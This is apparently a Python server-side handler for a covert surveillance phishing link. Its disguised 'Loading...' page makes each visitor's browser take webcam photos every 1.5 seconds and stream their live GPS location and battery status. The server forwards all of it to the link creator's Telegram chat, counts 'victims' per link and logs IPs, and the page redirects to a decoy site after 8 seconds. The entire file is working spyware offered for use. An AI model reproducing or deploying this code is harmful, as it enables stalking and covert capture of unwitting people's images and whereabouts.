import json
import os
import base64
import secrets
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import requests
from config import CONFIG

LINKS_FILE = os.path.join(CONFIG['data_dir'], 'links.json')
VISITORS_FILE = os.path.join(CONFIG['data_dir'], 'visitors.json')
DEBUG_LOG = os.path.join(CONFIG['data_dir'], 'debug.log')

def load_json(file_path):
    if not os.path.exists(file_path):
        return {}
    try:
        with open(file_path, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_json(file_path, data):
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    with open(file_path, 'w') as f:
        json.dump(data, f)

def log_debug(msg):
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(DEBUG_LOG, 'a') as f:
            f.write(f"{timestamp} - {msg}\n")
    except:
        pass

def send_photo_to_telegram(chat_id, photo_data_base64, visitor_id, bot_token):
    """Send photo to Telegram using base64 data directly"""
    try:
        # Decode base64 image
        photo_data = photo_data_base64.replace('data:image/jpeg;base64,', '')
        photo_binary = base64.b64decode(photo_data)
        
        # Save temporarily
        temp_photo = os.path.join(CONFIG['photos_dir'], f"temp_{visitor_id}.jpg")
        with open(temp_photo, 'wb') as f:
            f.write(photo_binary)
        
        # Send via Telegram API
        url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
        
        with open(temp_photo, 'rb') as photo_file:
            files = {'photo': ('photo.jpg', photo_file, 'image/jpeg')}
            data = {
                'chat_id': chat_id,
                'caption': f"📸 *Spy Capture!*\n🆔 `{visitor_id}`\n⏰ {datetime.now().strftime('%H:%M:%S')}",
                'parse_mode': 'Markdown'
            }
            response = requests.post(url, data=data, files=files, timeout=15)
        
        # Clean up temp file
        try:
            os.remove(temp_photo)
        except:
            pass
        
        log_debug(f"Photo sent to {chat_id}: {response.status_code}")
        return response.status_code == 200
    
    except Exception as e:
        log_debug(f"Error sending photo: {str(e)}")
        return False

def send_location_to_telegram(chat_id, lat, lng, visitor_id, bot_token):
    """Send location to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendLocation"
        data = {
            'chat_id': chat_id,
            'latitude': lat,
            'longitude': lng,
            'live_period': 60
        }
        requests.post(url, json=data, timeout=10)
        
        # Send Google Maps link
        msg_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        msg_data = {
            'chat_id': chat_id,
            'text': f"📍 *Live Location*\n🆔 `{visitor_id}`\n🗺️ [View on Map](https://maps.google.com/?q={lat},{lng})",
            'parse_mode': 'Markdown'
        }
        requests.post(msg_url, json=msg_data, timeout=10)
        log_debug(f"Location sent: {lat}, {lng}")
    except Exception as e:
        log_debug(f"Error sending location: {e}")

def send_battery_to_telegram(chat_id, level, charging, visitor_id, bot_token):
    """Send battery status to Telegram"""
    try:
        status = "⚡ Charging" if charging else "🔋 Discharging"
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            'chat_id': chat_id,
            'text': f"🔋 *Battery Update*\n🆔 `{visitor_id}`\n📊 Level: {level}%\n{status}",
            'parse_mode': 'Markdown'
        }
        requests.post(url, json=data, timeout=10)
        log_debug(f"Battery sent: {level}%")
    except Exception as e:
        log_debug(f"Error sending battery: {e}")

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Serve spy page with camera access"""
        try:
            parsed_path = urlparse(self.path)
            params = parse_qs(parsed_path.query)
            
            # Extract code from URL: domain.com/userid?=code
            path_parts = parsed_path.path.strip('/').split('/')
            user_id = path_parts[0] if path_parts else ''
            random_code = params.get('', [''])[0] if '' in params else ''
            
            # Load link data
            links_db = load_json(LINKS_FILE)
            link_data = links_db.get(random_code, {})
            target_url = link_data.get('url', 'https://google.com')
            
            # Generate unique visitor ID
            visitor_id = f"VIS_{int(time.time())}_{secrets.token_hex(4)}"
            
            # Update victim count
            if random_code in links_db:
                links_db[random_code]['victims'] = links_db[random_code].get('victims', 0) + 1
                save_json(LINKS_FILE, links_db)
            
            # Initialize visitor data
            visitors = load_json(VISITORS_FILE)
            visitors[visitor_id] = {
                'device': '',
                'ip': self.headers.get('X-Forwarded-For', self.client_address[0]),
                'target_url': target_url,
                'generated_by': user_id,
                'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'photos': 0,
                'locations': 0,
                'battery': 0
            }
            save_json(VISITORS_FILE, visitors)
            
            # HTML with fixed image capture
            html = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            background: #0a0a0a;
            color: #fff;
            font-family: -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .container { text-align: center; padding: 20px; }
        .spinner {
            width: 40px; height: 40px;
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid #f7971e;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: #4ade80; font-size: 14px; margin: 10px 0; }
        .recording {
            display: none;
            background: rgba(239,68,68,0.2);
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            color: #ef4444;
        }
        .dot {
            display: inline-block;
            width: 8px; height: 8px;
            background: #ef4444;
            border-radius: 50%;
            animation: pulse 1s infinite;
            margin-right: 5px;
        }
        @keyframes pulse {
            0%,100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        video, canvas { position: absolute; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner" id="spinner"></div>
        <div class="status" id="status">📸 Initializing camera...</div>
        <div class="recording" id="recording">
            <span class="dot"></span> Recording
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const VISITOR_ID = "''' + visitor_id + '''";
        const TARGET_URL = "''' + target_url + '''";
        const BOT_TOKEN = "''' + CONFIG['bot_token'] + '''";
        let stream = null;
        let isCapturing = false;
        
        // Initialize camera
        async function initCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                await video.play();
                
                document.getElementById('status').textContent = '📸 Camera active - Capturing...';
                document.getElementById('recording').style.display = 'inline-block';
                document.getElementById('spinner').style.display = 'none';
                isCapturing = true;
                
                // Start capturing photos
                captureInterval();
                
            } catch (err) {
                document.getElementById('status').textContent = '⚠️ Camera access denied';
                document.getElementById('spinner').style.display = 'none';
                console.error('Camera error:', err);
            }
        }
        
        function capturePhoto() {
            if (!isCapturing) return;
            
            try {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                
                if (!video.videoWidth || video.videoWidth === 0) return;
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const photoData = canvas.toDataURL('image/jpeg', 0.6);
                
                // Send to server
                sendData({ 
                    type: 'photo', 
                    data: photoData,
                    visitor_id: VISITOR_ID
                });
                
            } catch (err) {
                console.error('Capture error:', err);
            }
        }
        
        function captureInterval() {
            // Take first photo immediately
            capturePhoto();
            
            // Then every 1.5 seconds
            setInterval(() => {
                capturePhoto();
            }, 1500);
        }
        
        // Location tracking
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(
                (position) => {
                    sendData({
                        type: 'location',
                        data: {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude
                        },
                        visitor_id: VISITOR_ID
                    });
                },
                (err) => console.error('Location error:', err),
                { enableHighAccuracy: true, maximumAge: 5000 }
            );
        }
        
        // Battery monitoring
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                const sendBattery = () => {
                    sendData({
                        type: 'battery',
                        data: {
                            level: Math.round(battery.level * 100),
                            charging: battery.charging
                        },
                        visitor_id: VISITOR_ID
                    });
                };
                
                sendBattery();
                battery.addEventListener('levelchange', sendBattery);
                battery.addEventListener('chargingchange', sendBattery);
                setInterval(sendBattery, 10000);
            });
        }
        
        // Send data to server
        async function sendData(payload) {
            try {
                await fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error('Send error:', err);
            }
        }
        
        // Redirect after delay
        let seconds = 8;
        const countdownInterval = setInterval(() => {
            seconds--;
            if (seconds > 0) {
                document.getElementById('status').textContent = 
                    `⏳ Redirecting in ${seconds}s...`;
            }
        }, 1000);
        
        setTimeout(() => {
            clearInterval(countdownInterval);
            isCapturing = false;
            
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            document.getElementById('status').textContent = '🚀 Redirecting...';
            document.getElementById('recording').style.display = 'none';
            
            setTimeout(() => {
                window.location.href = TARGET_URL;
            }, 1000);
        }, 8000);
        
        // Start everything
        initCamera();
    </script>
</body>
</html>'''
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
            self.end_headers()
            self.wfile.write(html.encode('utf-8'))
            
        except Exception as e:
            log_debug(f"GET Error: {str(e)}")
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b'Error loading page')
    
    def do_POST(self):
        """Handle incoming data from spy page"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            data = json.loads(post_data)
            
            data_type = data.get('type')
            payload = data.get('data')
            visitor_id = data.get('visitor_id', f"VIS_{int(time.time())}")
            
            visitors = load_json(VISITORS_FILE)
            
            if visitor_id not in visitors:
                visitors[visitor_id] = {
                    'photos': 0,
                    'locations': 0,
                    'battery': 0
                }
            
            # Handle photo - Fixed to properly send to user who created the link
            if data_type == 'photo' and payload:
                # Find which user generated this link
                generated_by = visitors[visitor_id].get('generated_by', CONFIG['bot_token'])
                
                # Send photo to the user who created the link
                success = send_photo_to_telegram(
                    generated_by,  # Send to link creator
                    payload, 
                    visitor_id, 
                    CONFIG['bot_token']
                )
                
                if success:
                    visitors[visitor_id]['photos'] = visitors[visitor_id].get('photos', 0) + 1
                    log_debug(f"Photo #{visitors[visitor_id]['photos']} sent to user {generated_by}")
            
            # Handle location
            elif data_type == 'location' and payload:
                generated_by = visitors[visitor_id].get('generated_by', '')
                if generated_by:
                    send_location_to_telegram(
                        generated_by,
                        payload.get('lat', 0),
                        payload.get('lng', 0),
                        visitor_id,
                        CONFIG['bot_token']
                    )
                    visitors[visitor_id]['locations'] = visitors[visitor_id].get('locations', 0) + 1
            
            # Handle battery
            elif data_type == 'battery' and payload:
                generated_by = visitors[visitor_id].get('generated_by', '')
                if generated_by:
                    send_battery_to_telegram(
                        generated_by,
                        payload.get('level', 0),
                        payload.get('charging', False),
                        visitor_id,
                        CONFIG['bot_token']
                    )
                    visitors[visitor_id]['battery'] = visitors[visitor_id].get('battery', 0) + 1
            
            save_json(VISITORS_FILE, visitors)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode())
            
        except Exception as e:
            log_debug(f"POST Error: {str(e)}")
            self.send_response(500)
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'error', 'message': str(e)}).encode())
    
    def do_OPTIONS(self):
        """Handle CORS preflight"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
